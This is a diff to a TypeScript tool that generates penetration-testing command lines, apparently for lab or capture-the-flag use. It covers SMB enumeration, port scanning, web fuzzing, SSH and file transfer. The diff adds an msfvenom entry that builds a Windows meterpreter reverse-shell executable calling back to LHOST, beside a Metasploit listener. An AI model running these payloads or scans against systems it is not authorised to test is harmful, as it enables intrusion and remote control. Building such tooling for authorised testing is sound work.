@@ -5,9 +5,8 @@ import { Tool, ToolArg } from '../types';
 
 export const getUrlPrefix = (isHttps: boolean) => isHttps ? 'https://' : 'http://';
 
-export const formatTargetWithPort = (target: string, port: string) => {
-    if (!target) return '$TARGET';
-    return port ? `${target}:${port}` : target;
+export const formatTargetWithPort = (target: string) => {
+    return target || '$TARGET';
 };
 
 // Helper to create arguments easily
@@ -28,6 +27,9 @@ const ARG_CREDS = createArg.toggle('useCreds', 'Credentials', false);
 const ARG_WL_DIR = createArg.input('wordlistDir', 'Dir Wordlist', '/usr/share/wordlists/dirb/common.txt');
 const ARG_WL_SUB = createArg.input('wordlistSub', 'Subdomain Wordlist', '/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt');
 const ARG_WL_VHOST = createArg.input('wordlistVhost', 'VHost Wordlist', '/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt');
+const ARG_SHARE = createArg.toggle('accessShare', 'Access Share', false);
+const ARG_SHARE_NAME = createArg.input('shareName', 'Share Name', '', 'ShareName');
+
 
 // --- Tools Data ---
 
@@ -76,10 +78,11 @@ export const TOOLS: Tool[] = [
         subcategory: 'SMB',
         desc: 'FTP-like client to access SMB/CIFS resources.',
         authMode: 'optional',
-        args: [ARG_CREDS],
+        args: [ARG_CREDS, ARG_SHARE, ARG_SHARE_NAME],
         generate: (v, args) => {
             const auth = args.useCreds ? `-U '${v.username || '$USERNAME'}%${v.password || '$PASSWORD'}'` : '-N';
-            return `smbclient ${auth} -L //${v.target || '$TARGET'}/`;
+            const command = args.accessShare ? `//${v.target || '$TARGET'}/${args.shareName || '$SHARE'}` : `-L //${v.target || '$TARGET'}/`;
+            return `smbclient ${auth} ${command}`;
         }
     },
     {
@@ -89,12 +92,11 @@ export const TOOLS: Tool[] = [
         subcategory: 'SMB',
         desc: 'SMB enumeration tool.',
         authMode: 'optional',
-        args: [ARG_CREDS],
+        args: [ARG_CREDS, ARG_SHARE, ARG_SHARE_NAME],
         generate: (v, args) => {
-            const auth = args.useCreds
-                ? `-u '${v.username || 'user'}' -p '${v.password || 'pass'}'`
-                : `-u 'guest' -p ''`;
-            return `smbmap -H ${v.target || '$TARGET'} ${auth}`;
+            const auth = args.useCreds ? `-u '${v.username || 'user'}' -p '${v.password || 'pass'}'` : `-u 'guest' -p ''`;
+            const command = args.accessShare ? `-r ${args.shareName || '$SHARE'} --depth 2` : ``;
+            return `smbmap -H ${v.target || '$TARGET'} ${auth} ${command} --no-banner -q`;
         }
     },
     {
@@ -141,17 +143,6 @@ export const TOOLS: Tool[] = [
     },
 
     {
-        id: 'ftp',
-        name: 'FTP',
-        category: 'OTHER',
-        subcategory: 'Remote Access',
-        desc: 'Sophisticated file transfer program.',
-        authMode: 'required',
-        generate: (v, args) => {
-            return `lftp -u ${v.username || '$ftp_user'},${v.password || '$ftp_pass'} ftp://${v.target || '$TARGET'}`;
-        }
-    },
-    {
         id: 'ssh',
         name: 'SSH',
         category: 'OTHER',
@@ -160,6 +151,17 @@ export const TOOLS: Tool[] = [
         authMode: 'required',
         generate: (v, args) => {
             return `sshpass -p '${v.password || '$PASSWORD'}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${v.username || '$USERNAME'}@${v.target || '$TARGET'}`;
+        }
+    },
+    {
+        id: 'ftp',
+        name: 'FTP',
+        category: 'OTHER',
+        subcategory: 'Remote Access',
+        desc: 'Sophisticated file transfer program.',
+        authMode: 'required',
+        generate: (v, args) => {
+            return `lftp -u ${v.username || '$ftp_user'},${v.password || '$ftp_pass'} ftp://${v.target || '$TARGET'}`;
         }
     },
     {
@@ -174,6 +176,28 @@ export const TOOLS: Tool[] = [
         }
     },
     {
+        id: 'scp',
+        name: 'SCP',
+        category: 'OTHER',
+        subcategory: 'File Transfer',
+        desc: 'Secure copy (remote file copy program).',
+        authMode: 'required',
+        generate: (v, args) => {
+            return `scp -r ${v.filepath || '$FILEPATH'} ${v.username || '$USERNAME'}@${v.target || '$TARGET'}:/home/${v.username || '$DESTINATION'}/`;
+        }
+    },
+    {
+        id: 'impacket-smb',
+        name: 'Impacket SMB Server',
+        category: 'OTHER',
+        subcategory: 'File Transfer',
+        desc: 'Impacket SMB Server for file sharing.',
+        authMode: 'none',
+        generate: (v, args) => {
+            return `sudo impacket-smbserver share -smb2support .`;
+        }
+    },
+    {
         id: 'nmap',
         name: 'Nmap',
         category: 'SERVICE',
@@ -184,8 +208,8 @@ export const TOOLS: Tool[] = [
             createArg.toggle('udp', 'UDP Scan (-sU)', false),
         ],
         generate: (v, args) => {
-            const proto = args.udp ? '-sU' : '';
-            return `nmap ${proto} -sV -sC -Pn -v ${v.target || '$TARGET'}`;
+            const proto = args.udp ? '-sU --top-ports 100' : '';
+            return `nmap ${proto} -sV -sC -Pn ${v.target || '$TARGET'}`;
         }
     },
     {
@@ -196,26 +220,45 @@ export const TOOLS: Tool[] = [
         desc: 'Faster Nmap scanner.',
         authMode: 'none',
         generate: (v, args) => {
-            return `rustscan -a ${v.target || '$TARGET'} --ulimit 5000`;
+            return `rustscan -a ${v.target || '$TARGET'} --ulimit 5000 --no-banner`;
         }
     },
 
     {
-        id: 'msfconsole',
-        name: 'Metasploit Handler',
+        id: 'handler',
+        name: 'Handler',
         category: 'EXPLOIT',
-        subcategory: 'Listeners',
-        desc: 'Quick listener setup.',
+        subcategory: 'Metasploit',
+        desc: 'Quick Metasploit listener setup.',
         authMode: 'none',
         args: [
             createArg.input('lhost', 'LHOST', '', 'tun0 IP'),
             createArg.input('lport', 'LPORT', '4444', '4444'),
-            createArg.input('payload', 'Payload', 'linux/x64/meterpreter/reverse_tcp', 'linux/x64/...')
+            createArg.input('payload', 'Payload', 'windows/x64/meterpreter/reverse_tcp', 'Payload')
         ],
         generate: (v, args) => {
             const lhost = args.lhost || '$LHOST';
             const lport = args.lport || '$LPORT';
             return `msfconsole -q -x "use exploit/multi/handler; set payload ${args.payload || '$PAYLOAD'}; set LHOST ${lhost}; set LPORT ${lport}; run"`;
+        }
+    },
+
+    {
+        id: 'msfvenom',
+        name: 'Msfvenom',
+        category: 'EXPLOIT',
+        subcategory: 'Metasploit',
+        desc: 'Quick Msfvenom payload generation.',
+        authMode: 'none',
+        args: [
+            createArg.input('lhost', 'LHOST', '', 'tun0 IP'),
+            createArg.input('lport', 'LPORT', '4444', '4444'),
+            createArg.input('payload', 'Payload', 'windows/x64/meterpreter/reverse_tcp', 'Payload')
+        ],
+        generate: (v, args) => {
+            const lhost = args.lhost || '$LHOST';
+            const lport = args.lport || '$LPORT';
+            return `msfvenom -p ${args.payload || '$PAYLOAD'} LHOST=${lhost} LPORT=${lport} -f exe -o payload.exe`;
         }
     },
 
@@ -267,7 +310,7 @@ export const TOOLS: Tool[] = [
         args: [ARG_HTTPS, ARG_WL_VHOST],
         generate: (v, args) => {
             const prefix = getUrlPrefix(args.useHttps);
-            const targetWithPort = formatTargetWithPort(v.target, v.port);
+            const targetWithPort = formatTargetWithPort(v.target);
             return `gobuster vhost -u ${prefix}${targetWithPort} -w ${args.wordlistVhost || '$WORDLIST_VHOST'} --append-domain`;
         }
     },
@@ -281,7 +324,7 @@ export const TOOLS: Tool[] = [
         args: [ARG_HTTPS, ARG_OUTPUT, ARG_WL_VHOST],
         generate: (v, args) => {
             const prefix = getUrlPrefix(args.useHttps);
-            const targetWithPort = formatTargetWithPort(v.target, v.port);
+            const targetWithPort = formatTargetWithPort(v.target);
             let cmd = `ffuf -u ${prefix}${targetWithPort} -H 'Host:FUZZ.${v.target || '$TARGET'}' -w ${args.wordlistVhost || '$WORDLIST_VHOST'} -ic`;
             if (args.saveOutput) cmd += ` -o ffuf_vhost.txt`;
             return cmd;
@@ -294,13 +337,11 @@ export const TOOLS: Tool[] = [
         subcategory: 'Directory Fuzzing',
         desc: 'Fast web fuzzer for directories.',
         authMode: 'none',
-        args: [ARG_HTTPS, ARG_OUTPUT, ARG_WL_DIR],
+        args: [ARG_HTTPS, ARG_WL_DIR],
         generate: (v, args) => {
             const prefix = getUrlPrefix(args.useHttps);
-            const targetWithPort = formatTargetWithPort(v.target, v.port);
-            let cmd = `ffuf -u ${prefix}${targetWithPort}/FUZZ -w ${args.wordlistDir || '$WORDLIST_DIR'} -ic`;
-            if (args.saveOutput) cmd += ` -o ffuf_dir.txt`;
-            return cmd;
+            const targetWithPort = formatTargetWithPort(v.target);
+            return `ffuf -u ${prefix}${targetWithPort}/FUZZ -w ${args.wordlistDir || '$WORDLIST_DIR'} -ic`;
         }
     },
     {
@@ -310,13 +351,11 @@ export const TOOLS: Tool[] = [
         subcategory: 'Directory Fuzzing',
         desc: 'Simple, fast, recursive content discovery.',
         authMode: 'none',
-        args: [ARG_HTTPS, ARG_OUTPUT, ARG_WL_DIR],
+        args: [ARG_HTTPS],
         generate: (v, args) => {
             const prefix = getUrlPrefix(args.useHttps);
-            const targetWithPort = formatTargetWithPort(v.target, v.port);
-            let cmd = `feroxbuster -u ${prefix}${targetWithPort} -w ${args.wordlistDir || '$WORDLIST_DIR'}`;
-            if (args.saveOutput) cmd += ` -o ferox_output.txt`;
-            return cmd;
+            const targetWithPort = formatTargetWithPort(v.target);
+            return `feroxbuster -u ${prefix}${targetWithPort}`;
         }
     },
     {
@@ -326,10 +365,11 @@ export const TOOLS: Tool[] = [
         subcategory: 'Fingerprinting',
         desc: 'HTTP toolkit for single target.',
         authMode: 'none',
-        args: [ARG_HTTPS],
+        args: [ARG_OUTPUT],
         generate: (v, args) => {
-            const prefix = getUrlPrefix(args.useHttps);
-            return `httpx -u ${prefix}${v.target || '$TARGET'}`;
+            let cmd = `httpx -list -status-code -title -no-fallback ${v.filepath || '$FILEPATH'}`;
+            if (args.saveOutput) cmd += ` -o httpx.txt`;
+            return cmd;
         }
     },
     {
@@ -337,13 +377,11 @@ export const TOOLS: Tool[] = [
         name: 'Gowitness',
         category: 'WEB',
         subcategory: 'Fingerprinting',
-        desc: 'Screenshot utility.',
+        desc: 'Screenshot utility_FILE.',
         authMode: 'none',
-        args: [ARG_HTTPS],
+        args: [],
         generate: (v, args) => {
-            const prefix = getUrlPrefix(args.useHttps);
-            const targetWithPort = formatTargetWithPort(v.target, v.port);
-            return `gowitness single ${prefix}${targetWithPort} -P screenshots`;
+            return `cat ${v.filepath || '$FILEPATH'} | gowitness scan file -f - --write-db && gowitness report server --db-uri sqlite://gowitness.sqlite3 --screenshot-path ./screenshots --port 7171`;
         }
     },
     {
@@ -356,7 +394,7 @@ export const TOOLS: Tool[] = [
         args: [ARG_HTTPS],
         generate: (v, args) => {
             const prefix = getUrlPrefix(args.useHttps);
-            const targetWithPort = formatTargetWithPort(v.target, v.port);
+            const targetWithPort = formatTargetWithPort(v.target);
             return `whatweb ${prefix}${targetWithPort}`;
         }
     },
@@ -370,7 +408,7 @@ export const TOOLS: Tool[] = [
         args: [ARG_HTTPS, ARG_OUTPUT],
         generate: (v, args) => {
             const prefix = getUrlPrefix(args.useHttps);
-            const targetWithPort = formatTargetWithPort(v.target, v.port);
+            const targetWithPort = formatTargetWithPort(v.target);
             let cmd = `nuclei -u ${prefix}${targetWithPort}`;
             if (args.saveOutput) cmd += ` -o nuclei_vulns.txt`;
             return cmd;
